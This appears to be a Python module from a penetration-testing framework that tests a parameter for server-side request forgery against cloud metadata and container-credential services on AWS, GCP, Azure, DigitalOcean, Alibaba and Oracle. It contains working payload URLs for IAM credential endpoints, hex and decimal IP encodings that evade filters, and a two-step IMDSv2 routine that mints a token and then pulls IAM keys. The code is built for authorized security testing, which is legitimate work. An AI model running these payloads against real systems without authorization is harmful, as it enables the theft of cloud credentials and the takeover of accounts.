"""Edge-case test: test_cloud_metadata."""


from praetor import client
from praetor.tools.testing._verdict import make_verdict


async def test_cloud_metadata_impl(
    session: str,
    parameter: str = "url",
    path: str = "/",
    injection_point: str = "query",
    extra_headers: dict | None = None,
    imdsv2: bool = False,
) -> dict:
    """Test SSRF to cloud metadata + container-credential services (AWS/GCP/Azure/DO/Alibaba/Oracle).

    Covers the modern header-less AWS credential pivots (ECS/EKS Pod Identity)
    that stay reachable when IMDSv1 is disabled — IMDSv2 needs a token PUT a
    plain parameter SSRF cannot issue, so it is not attempted here.

    GCP and Azure IMDS require a request header (`Metadata-Flavor: Google` /
    `Metadata: true`) on the INNER metadata fetch. A parameter SSRF cannot set
    that header itself; pass `extra_headers` only when the target's SSRF is
    known to forward request headers to the fetched URL.

    Args:
        session: Session name
        parameter: Parameter to inject SSRF payload into
        path: Endpoint path
        injection_point: Where to inject: 'query' or 'body'
        extra_headers: Optional headers added to the outer request (e.g.
            {"Metadata-Flavor": "Google"}) for header-forwarding SSRF only.
    """
    metadata_endpoints = [
        # Header-less AWS credential endpoints first — highest-value, reachable
        # via a plain parameter SSRF even when IMDSv1 is turned off.
        ("AWS ECS/Fargate creds", "http://169.254.170.2/v2/credentials/", ["AccessKeyId", "SecretAccessKey"]),
        ("AWS EKS Pod Identity", "http://169.254.170.23/v1/credentials", ["AccessKeyId", "SecretAccessKey"]),
        ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
        # Each indicator must be specific enough that it's extremely unlikely to
        # appear in a non-metadata response. Weak generic words like "hostname",
        # "network", "compute", "instance" are rejected — they match documentation
        # pages, API listings, and any page mentioning servers.
        ("AWS Hex IP", "http://0xA9FEA9FE/latest/meta-data/", ["ami-id", "instance-id"]),
        ("AWS Decimal IP", "http://2852039166/latest/meta-data/", ["ami-id", "instance-id"]),
        ("GCP Metadata (hdr-gated)", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ["access_token", "expires_in"]),
        ("Azure Metadata (hdr-gated)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "vmId"]),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id"]),
        ("Alibaba", "http://100.100.100.200/latest/meta-data/", ["instance-id", "region-id"]),
        ("Oracle Cloud", "http://192.0.0.192/opc/v2/instance/", ["ociAdName", "canonicalRegionName"]),
    ]

    lines = [f"Cloud Metadata SSRF Test: {parameter} on {path}\n"]
    vulns = []

    for name, url, indicators in metadata_endpoints:
        inject_path = f"{path}?{parameter}={url}" if injection_point == "query" else path
        req = {"session": session, "method": "GET", "path": inject_path}
        if injection_point == "body":
            req["method"] = "POST"
            req["data"] = f"{parameter}={url}"
        if extra_headers:
            req["headers"] = extra_headers

        resp = await client.post("/api/session/request", json=req)
        if "error" in resp:
            lines.append(f"  [{name}] Error")
            continue

        body = resp.get("response_body", "")
        status = resp.get("status", 0)
        matched = [i for i in indicators if i.lower() in body.lower()]

        if matched:
            vulns.append(f"CRITICAL: {name} — metadata leaked ({', '.join(matched)})")
            lines.append(f"  [{name}] VULNERABLE — {', '.join(matched)} found in response")
        elif status == 200 and len(body) > 100:
            lines.append(f"  [{name}] Possible — 200 OK, {len(body)}B response (review manually)")
        else:
            lines.append(f"  [{name}] Not vulnerable ({status})")

    # IMDSv2 two-step (default on modern EC2): a plain GET-only SSRF can't reach
    # it, but a header/method-forwarding SSRF can — PUT a token, then GET the IAM
    # creds carrying that token. Gated on imdsv2=True (operator confirms the SSRF
    # forwards method + headers, e.g. gopher / full-request SSRF).
    if imdsv2:
        import re as _re
        tok_url = "http://169.254.169.254/latest/api/token"
        tok_path = (f"{path}?{parameter}={tok_url}" if injection_point == "query" else path)
        tok_req = {"session": session, "method": "PUT", "path": tok_path,
                   "headers": {**(extra_headers or {}),
                               "X-aws-ec2-metadata-token-ttl-seconds": "21600"}}
        if injection_point == "body":
            tok_req["path"] = path
            tok_req["data"] = f"{parameter}={tok_url}"
        tok_resp = await client.post("/api/session/request", json=tok_req)
        token = ""
        if "error" not in tok_resp:
            # A real IMDSv2 token response IS the token (short body, ~56 chars),
            # not a token buried in a big reflected page — require the whole
            # (trimmed) body to BE a token-shaped string to avoid false positives.
            tb = (tok_resp.get("response_body") or "").strip()
            token = tb if (40 <= len(tb) <= 120
                           and _re.fullmatch(r"[A-Za-z0-9_\-=]+", tb)) else ""
        if token:
            creds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            cr_path = (f"{path}?{parameter}={creds_url}" if injection_point == "query" else path)
            cr_req = {"session": session, "method": "GET", "path": cr_path,
                      "headers": {**(extra_headers or {}), "X-aws-ec2-metadata-token": token}}
            if injection_point == "body":
                cr_req["path"] = path
                cr_req["data"] = f"{parameter}={creds_url}"
            cr = await client.post("/api/session/request", json=cr_req)
            cbody = cr.get("response_body", "") if "error" not in cr else ""
            if any(i in cbody for i in ("AccessKeyId", "SecretAccessKey")):
                vulns.append("CRITICAL: AWS IMDSv2 — token minted + IAM creds leaked")
                lines.append("  [AWS IMDSv2] VULNERABLE — token PUT succeeded, IAM creds returned")
            else:
                lines.append("  [AWS IMDSv2] token minted but creds fetch did not leak (review)")
        else:
            lines.append("  [AWS IMDSv2] no token (SSRF not forwarding PUT+header, or IMDSv2 off)")

    if vulns:
        lines.append(f"\n*** {len(vulns)} CLOUD METADATA LEAKS ***")
    else:
        lines.append("\nNo cloud metadata exposure detected.")

    human = "\n".join(lines)
    if vulns:
        verdict, confidence = "CONFIRMED", 0.9
        ev = f"cloud metadata SSRF: {len(vulns)} cloud(s) leaked credentials/identity"
    else:
        verdict, confidence = "FAILED", 0.1
        ev = "no cloud metadata exposure across AWS / GCP / Azure / DO"

    return make_verdict(
        verdict, confidence, ev,
        vuln_type="ssrf",
        details={"parameter": parameter, "path": path, "vulnerabilities": vulns},
        summary=human,
    )
